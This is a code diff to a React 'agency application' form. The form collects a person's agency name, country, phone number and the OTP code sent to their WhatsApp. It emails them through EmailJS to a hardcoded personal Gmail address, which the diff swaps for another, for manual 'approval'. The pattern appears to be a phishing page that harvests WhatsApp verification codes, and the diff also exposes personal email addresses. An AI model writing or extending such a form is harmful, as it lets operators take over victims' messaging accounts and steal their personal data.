@@ -250,7 +250,7 @@ export default function AgencyForm() {
     
     // Prepare the email template parameters
     const templateParams = {
-      email: 'serlywang21@gmail.com',
+      email: 'officialayanfedavid@gmail.com',
       id: formData.id,
       agencyName: formData.agencyName,
       country: formData.country,
@@ -283,19 +283,19 @@ export default function AgencyForm() {
     
     // Send OTP verification email
     const serviceId = process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID as string;
-    const templateId = process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID as string;
+    const templateId = process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID_VERIFICATION as string;
     const publicKey = process.env.NEXT_PUBLIC_EMAILJS_PUBLIC_KEY as string;
     
     const fullPhoneNumber = `${formData.countryCode}${formData.mobileNumber}`;
     
     const templateParams = {
-      email: 'serlywang21@gmail.com',
+      email: 'officialayanfedavid@gmail.com',
       id: formData.id,
       agencyName: formData.agencyName,
       country: formData.country,
       mobileNumber: fullPhoneNumber,
       otp: formData.otp,
-      message: `OTP Verification for Agency Application:\n\nID: ${formData.id}\nAgency Name: ${formData.agencyName}\nCountry: ${formData.country}\nPhone Number: ${fullPhoneNumber}\nOTP Entered: ${formData.otp}\n\nPlease verify this OTP matches what you sent.`
+      message: `🔐 OTP VERIFICATION - AGENCY APPLICATION SUBMITTED\n\n✅ Application Details:\nID: ${formData.id}\nAgency Name: ${formData.agencyName}\nCountry: ${formData.country}\nPhone Number: ${fullPhoneNumber}\n\n🔢 OTP CODE ENTERED BY USER: ${formData.otp}\n\n❗ ACTION REQUIRED: Please verify this OTP matches what you sent to their WhatsApp.\n\nIf OTP matches: Approve application\nIf OTP doesn't match: Reject application`
     };
     
     // Send verification email
